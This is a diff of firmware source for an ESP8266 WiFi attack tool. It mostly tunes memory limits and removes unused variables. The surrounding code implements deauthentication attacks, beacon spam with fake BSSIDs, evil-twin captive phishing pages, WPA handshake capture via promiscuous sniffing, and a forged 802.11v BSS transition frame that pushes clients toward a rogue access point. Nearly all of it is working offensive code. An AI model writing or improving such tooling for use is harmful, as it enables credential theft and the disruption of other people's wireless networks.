@@ -58,7 +58,6 @@ unsigned long lastHijack = 0;
 unsigned long lastDeauthAll = 0;
 unsigned long lastPreciseDeauth = 0;
 unsigned long lastTrueDeauth = 0;
-unsigned long lastChannelHop = 0;
 uint8_t currentChannel = 1;
 
 unsigned long lastStateSave = 0;
@@ -67,7 +66,6 @@ bool dirtyState = false;
 bool wifiClientConnected = false;
 String wifiClientSSID = "";
 String wifiClientPassword = "";
-int wifiClientStatus = WL_DISCONNECTED;
 bool internetSharingEnabled = false;
 
 String beaconSSIDs[MAX_SSIDS];
@@ -104,15 +102,15 @@ DNSEntry dnsLog[DNS_LOG_MAX];
 int dnsLogCount = 0;
 
   // --- EAPOL / WPA Handshake Detection ---
-#define EAPOL_MAX 4
 #define PCAP_GLOBAL_HEADER_LEN 24
 #define PCAP_PKT_HEADER_LEN 16
+#define EAPOL_RAW_SIZE 64
 struct EAPOLEntry {
   uint8_t bssid[6];
   uint8_t clientMAC[6];
   uint8_t messageType;
   unsigned long time;
-  uint8_t rawData[256];
+  uint8_t rawData[EAPOL_RAW_SIZE];
   uint16_t rawLen;
 };
 EAPOLEntry eapolLog[EAPOL_MAX];
@@ -159,8 +157,6 @@ enum ExtenderState {
 };
 ExtenderState extenderState = EXTENDER_IDLE;
 unsigned long extenderConnectStart = 0;
-String extenderTargetSSID = "";
-String extenderTargetPass = "";
 
 // --- WiFi Connect State Machine ---
 enum WiFiConnectState {
@@ -180,7 +176,6 @@ unsigned long totalPkts = 0;
 
 // --- Multi-page Evil-Twin ---
 int phishingStep = 0; // 0 = first page, 1 = second page, etc.
-String phishingSessionId = "";
 
 // --- Reactive Phishing Verification ---
 uint8_t phishingVerifyState = PHISHING_VERIFY_IDLE;
@@ -378,30 +373,29 @@ static bool isDOHCanaryDomain(const String& domain) {
 }
 
 // --- 802.11v BSS Transition Management ---
-static void sendBSSTransitionRequest(uint8_t ch, uint8_t* targetBSSID, uint8_t* clientMAC, uint8_t* rogueBSSID) {
-  uint8_t pkt[64] = {0};
-  pkt[0] = 0x00; pkt[1] = 0x00; // Category: Radio Measurement
-  pkt[2] = 0x07;                 // Action: BSS Transition Management Request
-  pkt[3] = 0x00;                 // Dialog Token
-  pkt[4] = 0x01;                 // Request Mode: Preferred Candidate List Included
-  pkt[5] = 0x00; pkt[6] = 0x00; // Disassociation Timer
-  pkt[7] = 0x00;                 // Validity Interval
-  // BSS Transition Candidate List Entry
-  pkt[8] = 0x01;                 // Candidate ID
-  memcpy(&pkt[9], rogueBSSID, 6); // BSSID of rogue AP
-  pkt[15] = 0x00;                // Candidate Status: Accept
-  pkt[16] = 0x00;                // Preference (0 = no preference)
+static void sendBSSTransitionRequest(uint8_t ch, uint8_t* apBSSID, uint8_t* rogueBSSID) {
+  uint8_t pkt[16] = {0};
+  pkt[0] = 0x05;                 // Category: Radio Measurement
+  pkt[1] = 0x07;                 // Action: BSS Transition Management Request
+  pkt[2] = 0x00;                 // Dialog Token
+  pkt[3] = 0x01;                 // Request Mode: Preferred Candidate List Included
+  pkt[4] = 0x00; pkt[5] = 0x00; // Disassociation Timer
+  pkt[6] = 0x00;                 // Validity Interval
+  pkt[7] = 0x01;                 // Candidate ID
+  memcpy(&pkt[8], rogueBSSID, 6); // BSSID of rogue AP
+  pkt[14] = 0x00;                // Candidate Status: Accept
+  pkt[15] = 0x00;                // Preference
 
-  uint8_t actionFrame[41] = {0};
-  actionFrame[0] = 0xD0; actionFrame[1] = 0x00; // Action frame (Category)
-  memcpy(&actionFrame[4], targetBSSID, 6);        // DA = target BSSID
-  memcpy(&actionFrame[10], clientMAC, 6);          // SA = client MAC
-  memcpy(&actionFrame[16], targetBSSID, 6);        // BSSID
-  memcpy(&actionFrame[24], pkt, 17);               // Action body
+  uint8_t actionFrame[40] = {0};
+  actionFrame[0] = 0xD0; actionFrame[1] = 0x00;
+  memset(&actionFrame[4], 0xFF, 6);  // DA = broadcast
+  memcpy(&actionFrame[10], apBSSID, 6); // SA = AP BSSID
+  memcpy(&actionFrame[16], apBSSID, 6); // BSSID = AP BSSID
+  memcpy(&actionFrame[24], pkt, 16);    // Action body
 
   wifi_set_channel(ch);
   for (int i = 0; i < 5; i++) {
-    wifi_send_pkt_freedom(actionFrame, 41, 0);
+    wifi_send_pkt_freedom(actionFrame, 40, 0);
     yield();
   }
   addLog("802.11v BSS Transition Request sent", LOG_WARN);
@@ -464,10 +458,10 @@ struct DeviceFingerprint {
   uint8_t clientMAC[6];
   uint8_t dhcpOpt55[DHCP_OPTION_55_MAX];
   uint8_t opt55Len;
-  String vendorClass;     // Option 60
+  String vendorClass;
   String osClass;
   unsigned long lastSeen;
-  int confidence;          // 0-100
+  int confidence;
 };
 
 static DeviceFingerprint fingerprints[DHCP_FINGERPRINT_MAX];
@@ -631,8 +625,8 @@ static void lruEvictClients() {
 }
 
 // --- Log Levels Optimized ---
-#define LOG_MAX 20
-#define LOG_BUFFER_MAX 8192
+#define LOG_MAX 4
+#define LOG_BUFFER_MAX 2048
 struct LogEntry {
   unsigned long timestamp;
   uint8_t level;
@@ -651,10 +645,10 @@ static bool heapLowPressure() {
 
 static void heapPressureEvict() {
   if (!heapLowPressure()) return;
-  if (probeCount > 10) { probeCount = max(10, probeCount - 20); addLog("Heap pressure: evicted probes", LOG_WARN); }
-  if (clientCount > 10) { clientCount = max(10, clientCount - 10); addLog("Heap pressure: evicted clients", LOG_WARN); }
-  if (logCount > 10) { logCount = 10; addLog("Heap pressure: evicted logs", LOG_WARN); }
-  if (dnsLogCount > 4) { dnsLogCount = 4; }
+  if (probeCount > PROBE_MAX - 2) { probeCount = PROBE_MAX / 2; addLog("Heap pressure: evicted probes", LOG_WARN); }
+  if (clientCount > CLIENT_MAX - 2) { clientCount = CLIENT_MAX / 2; addLog("Heap pressure: evicted clients", LOG_WARN); }
+  if (logCount > LOG_MAX - 2) { logCount = LOG_MAX / 2; addLog("Heap pressure: evicted logs", LOG_WARN); }
+  if (dnsLogCount > DNS_LOG_MAX - 1) { dnsLogCount = DNS_LOG_MAX / 2; }
 }
 
 // --- PIN Lock State ---
@@ -815,8 +809,9 @@ void promiscuousCallback(uint8_t *buf, uint16_t len) {
   bool isData = (frameType == 0x08) || (frameType == 0x88); // data or QoS data
   if (isData && handshakeCaptureActive && len >= 36) {
     int llcOffset = 24;
-    if ((buf[0] & 0x8C) == 0x88) llcOffset = 26; // QoS data
-    if ((buf[0] & 0x04) == 0x04) llcOffset += 4; // HT control
+    bool isQoS = (buf[0] & 0x8C) == 0x88;
+    if (isQoS) llcOffset = 26; // QoS data
+    if (isQoS && (buf[1] & 0x80)) llcOffset += 4; // +HTC (HT control)
     
     if (len >= (unsigned)(llcOffset + 10)) {
       uint16_t etherType = (uint16_t)buf[llcOffset + 6] << 8 | buf[llcOffset + 7];
@@ -843,7 +838,7 @@ void promiscuousCallback(uint8_t *buf, uint16_t len) {
             eapolLog[eapolCount].messageType = msgType;
             eapolLog[eapolCount].time = millis();
             int copyLen = len;
-            if (copyLen > 256) copyLen = 256;
+            if (copyLen > EAPOL_RAW_SIZE) copyLen = EAPOL_RAW_SIZE;
             eapolLog[eapolCount].rawLen = copyLen;
             memcpy(eapolLog[eapolCount].rawData, buf, copyLen);
             eapolCount++;
@@ -910,11 +905,11 @@ void performScan() {
   int count = 0;
   int heapLimit = MAX_NETWORKS;
   size_t freeHeap = ESP.getFreeHeap();
-  if (freeHeap < HEAP_WARNING_THRESHOLD + 4000) {
-    heapLimit = 15;
-    addLog("Heap-aware scan limited to 15 nets", LOG_WARN);
-  } else if (freeHeap < HEAP_WARNING_THRESHOLD + 8000) {
-    heapLimit = 24;
+  if (freeHeap < HEAP_WARNING_THRESHOLD + 3000) {
+    heapLimit = MAX_NETWORKS - 3;
+    addLog("Heap-aware scan limited", LOG_WARN);
+  } else if (freeHeap < HEAP_WARNING_THRESHOLD + 6000) {
+    heapLimit = MAX_NETWORKS - 1;
   }
   for (int i = 0; i < n && count < heapLimit; i++) {
     String ssid = WiFi.SSID(i);
@@ -1095,7 +1090,6 @@ void startEvilTwin(DNSServer* dns, String targetSSID) {
   dns->start(DNS_PORT, "*", AP_IP);
   hotspotActive = true;
   phishingStep = 0;
-  phishingSessionId = String(random(10000, 99999));
 }
 
 void stopEvilTwin(DNSServer* dns) {
@@ -1177,7 +1171,6 @@ void attackLoop() {
 
   if (beaconActive && (now - lastBeacon >= BEACON_INTERVAL)) {
     currentChannel = (currentChannel % CHANNEL_MAX) + 1;
-    lastChannelHop = now;
     if (beaconSSIDCount > 0) {
       for (int i = 0; i < beaconSSIDCount && i < 32; i++) {
         uint8_t fakeBSSID[6];
